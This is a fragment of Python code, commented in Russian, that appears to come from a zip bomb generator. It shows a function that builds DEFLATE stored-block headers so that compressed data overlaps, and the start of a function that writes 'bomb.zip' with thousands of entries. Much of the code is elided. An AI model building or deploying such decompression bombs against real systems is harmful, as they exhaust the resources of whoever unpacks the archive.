...
def make_quote_header(length: int) -> bytes:
    """
    DEFLATE stored block header (BTYPE=00).
    Заставляет декомпрессор «проглотить» следующие length байт как сырые данные.

    Формат: [BFINAL+BTYPE=0x00] [LEN 2B LE] [NLEN 2B LE]
    NLEN = one's complement of LEN
    """
    assert 0 < length <= 0xFFFF, "Длина блока должна быть от 1 до 65535"

    nlen = (~length) & 0xFFFF  # побитовое НЕ, обрезанное до 16 бит

    return struct.pack('<BHH',
                       0x00,  # BFINAL=0 (не последний блок), BTYPE=00 (stored)
                       length,  # LEN
                       nlen  # NLEN = ~LEN
                       )
...
def generate_zip_file(filename="bomb.zip", num_files=10000, kernel_size=1024 * 1024):
    ...
    current_uncomp_size = kernel_comp * 3
    prefix_uncomp = b""
